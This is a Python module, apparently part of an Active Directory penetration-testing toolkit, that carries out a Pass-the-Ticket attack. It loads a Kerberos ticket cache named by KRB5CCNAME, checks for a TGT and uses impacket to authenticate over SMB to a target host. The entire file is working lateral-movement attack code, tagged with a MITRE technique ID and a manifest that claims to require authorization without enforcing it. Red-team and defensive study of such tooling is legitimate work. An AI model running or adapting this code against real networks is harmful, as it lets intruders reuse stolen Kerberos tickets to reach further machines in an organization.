"""Pass-the-Ticket — use Kerberos tickets for lateral movement."""


import os
import sys
from typing import Any

from adxpl.core.credential import ADCredential


MANIFEST = {
    "capability_id": "adxpl.lateral.ptt.v1",
    "safety_class": "ACTIVE",
    "requires_authorization": True,
    "side_effects": ["kerberos_authentication"],
    "output_schema": "xpl.finding.v1",
    "mitre": ["T1550.003"],
}


def run(args: Any) -> int:
    cred = ADCredential.from_args(args)

    print(f"[*] Pass-the-Ticket → {args.target} ({args.domain})")

    try:
        from impacket.krb5.ccache import CCache
        from impacket.smbconnection import SMBConnection
    except ImportError:
        print("[!] impacket not installed", file=sys.stderr)
        return 1

    ccache_file = os.environ.get("KRB5CCNAME")
    if not ccache_file:
        print("[!] Set KRB5CCNAME to the .ccache file path", file=sys.stderr)
        print("[*] Example: export KRB5CCNAME=/tmp/krb5cc_user", file=sys.stderr)
        return 1

    if not os.path.isfile(ccache_file):
        print(f"[!] CCache file not found: {ccache_file}", file=sys.stderr)
        return 1

    try:
        ccache = CCache.loadFile(ccache_file)
        principal = ccache.principal.prettyPrint().decode()
        print(f"[+] Loaded ticket for: {principal}")

        creds = ccache.getCredential(f"krbtgt/{args.domain.upper()}@{args.domain.upper()}")
        if creds:
            print(f"[+] TGT found for realm {args.domain.upper()}")
        else:
            print("[*] No TGT — attempting with available service tickets")

        smb = SMBConnection(args.target, args.target, sess_port=445)
        smb.kerberosLogin(
            cred.username or "", "", args.domain,
            "", "", kdcHost=args.target,
        )
        print(f"[+] Kerberos auth successful to {args.target}")
        print(f"    OS: {smb.getServerOS()}")
        smb.logoff()
        return 0

    except Exception as exc:
        print(f"[-] PtT failed: {exc}", file=sys.stderr)
        return 1
